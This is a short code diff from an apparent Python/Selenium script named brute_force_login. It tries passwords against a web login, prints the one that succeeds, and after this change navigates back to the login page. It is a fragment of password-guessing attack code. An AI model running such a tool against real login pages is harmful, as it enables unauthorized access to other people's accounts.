@@ -39,8 +39,10 @@ def brute_force_login():
 
         if driver.current_url == user_url:
             print(f'Login successful with password : {password}' + ' ' + driver.current_url)
+            driver.get(login_url)
         if driver.current_url == success_url:
             print(f'Login successful with password : {password}' + ' ' + driver.current_url)
+            driver.get(login_url)
 
         
     driver.quit()
